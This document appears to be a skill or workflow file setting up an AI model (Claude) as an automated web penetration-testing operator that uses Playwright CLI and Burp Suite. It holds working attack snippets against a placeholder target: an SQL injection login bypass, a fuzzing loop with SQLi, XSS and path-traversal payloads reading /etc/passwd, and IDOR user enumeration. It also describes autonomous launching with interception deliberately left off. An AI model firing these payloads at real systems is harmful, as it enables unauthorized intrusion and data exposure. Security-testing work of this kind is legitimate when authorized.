# Burp Suite Workflow v3.0

**Owner:** cyber-operator
**Purpose:** 3-layer attack model — Playwright CLI drives attacks, Burp GUI passively observes, Burp MCP gives Claude programmatic HTTP history access

---

## Architecture: 3-Layer Model

```
Layer 1: Playwright CLI (attack driver)
──────────────────────────────────────
playwright-cli -s=session open --headed <url>
playwright-cli -s=session snapshot → fill → eval → network
All browser control here. Token-efficient. Session-persistent.

Layer 2: Burp GUI (passive visual observer)
───────────────────────────────────────────
the operator observes HTTP History in real time
Intercept OFF (passive — Claude's automation must not be blocked)
the operator can right-click → Send to Repeater / Intruder anytime

Layer 3: Burp MCP (Claude reads history programmatically)
──────────────────────────────────────────────────────────
Registered in .claude.json: SSE at http://localhost:9876/sse
Claude queries proxy history, sends to Repeater, reads responses
Active only when MCP Server BApp is installed and Burp is running
See: skills/integrations/burp-mcp.md
```

---

## Session Setup

**Claude (CLI — always available):**
No setup needed — `playwright-cli` drives the attack.

**Burp MCP (auto-launch — permission granted):**
Claude checks port 9876 → auto-launches Burp if needed → no the operator input required.
See full prerequisite check sequence: `skills/integrations/burp-mcp.md`

**the operator (optional — visual observation):**
- [ ] Watch Burp's HTTP History tab as Claude works
- [ ] Turn Intercept **OFF** — passive capture mode, not blocking mode
- [ ] Open Logger tab for full chronological stream

> **Why Intercept OFF?** Claude doesn't need requests paused for manual review. Intercept ON would block CLI automation. Leave it off — Burp logs everything passively.

---

## Proxy Routing (CLI through Burp)

To route all Playwright CLI traffic through Burp (the operator sees every request):

```json
// .playwright/cli.config.json
{
  "proxy": {
    "server": "http://127.0.0.1:8080"
  }
}
```

Claude will note when proxy is active:
> "Routing through Burp proxy at 127.0.0.1:8080 — all traffic visible in HTTP History."

---

## What Claude Uses for Attack Operations

| Burp Tool | Claude's Equivalent |
|-----------|---------------------|
| Proxy / Intercept | Layer 1: `playwright-cli eval` with fetch() + route mocking |
| Modify request | `playwright-cli eval "fetch(url,{method,headers,body})"` |
| Repeater | Layer 3: `burp_send_to_repeater` (Burp MCP) OR `playwright-cli eval` fetch |
| Intruder (fuzzing) | `playwright-cli eval` loop with payload variants |
| HTTP History | Layer 3: `burp_get_proxy_history` (Burp MCP) OR `playwright-cli network` |
| Decoder | `playwright-cli eval "atob(...) / btoa(...) / encodeURIComponent(...)"` |
| Response diffing | Capture two responses in eval, compare programmatically |

---

## Attack Patterns

### Request Interception + Modification (Playwright eval)
```bash
# Navigate to target
playwright-cli -s=attack open https://target.com/login

# Test SQLi via eval fetch
playwright-cli -s=attack eval "
  fetch('/api/login', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({username: \"admin' OR 1=1--\", password: 'x'})
  }).then(r => r.text())
"
```

### Payload Fuzzing (Replaces Burp Intruder)
```bash
# Fuzz with multiple payloads via eval
playwright-cli -s=attack eval "
  const payloads = [\"'\", '\" OR 1=1--', '<script>alert(1)</script>', '../../../etc/passwd'];
  Promise.all(payloads.map(p =>
    fetch('/search?q=' + encodeURIComponent(p)).then(r => r.text().then(t => ({p, len: t.length})))
  ))
"
```

### IDOR Discovery
```bash
# Sequential ID scan
playwright-cli -s=attack eval "
  Promise.all([1,2,3,4,5].map(id =>
    fetch('/api/users/' + id, {credentials: 'include'}).then(r => r.json().then(d => ({id, user: d.username})))
  ))
"
```

### Response Analysis via Burp MCP (Layer 3)
```
# Read HTTP history after automated scan
burp_get_proxy_history({ host: "target.com" })
# → Claude identifies anomalous responses, status codes, headers
```

---

## When the operator Uses Burp Actively

Burp becomes hands-on when:
- **Visual confirmation needed:** the operator wants to see raw request/response with highlighting
- **Manual variant testing:** the operator wants to hand-tweak something Claude found
- **Teaching/review mode:** the operator is learning by reading the raw HTTP Claude generated

In these cases, Claude narrates:
> "I've identified a suspicious parameter at `/api/export?format=csv`. It's in your HTTP History — right-click → Send to Repeater and try changing `format` to `../../../etc/passwd`."

---

## Playwright CLI vs Burp Manual — Decision Guide

| Situation | Who handles it |
|-----------|---------------|
| Automated payload fuzzing (10+ payloads) | Claude via CLI eval loop |
| Single modified request to verify | Either — Claude `eval` fetch OR the operator in Repeater |
| Visual inspection of full request headers | the tester in Burp HTTP History OR Burp MCP |
| Automated IDOR scan across ID range | Claude via CLI eval loop |
| Out-of-band (DNS callback) detection | interactsh (Community) or Burp Collaborator (Pro) |
| Read HTTP history programmatically | Claude via Burp MCP (Layer 3) |
| Teaching moment — the operator wants to see raw HTTP | the tester in Burp GUI (Layer 2) |
| Speed (3+ minute attack chain) | Claude — fully automated via CLI |

---

## Burp MCP Integration

Full integration spec: `skills/integrations/burp-mcp.md`

**Quick reference:**
- Auto-launch: Claude starts Burp autonomously (permission granted)
- Port: 9876 (SSE MCP endpoint)
- BApp: MCP Server BApp must be installed from Burp's BApp Store (one-time manual step)
- Community Edition: No Collaborator — use interactsh for OOB callbacks

---

*Burp Suite Workflow v3.0 | cyber-operator | CLI-primary, 3-layer model | 2026-03-10*
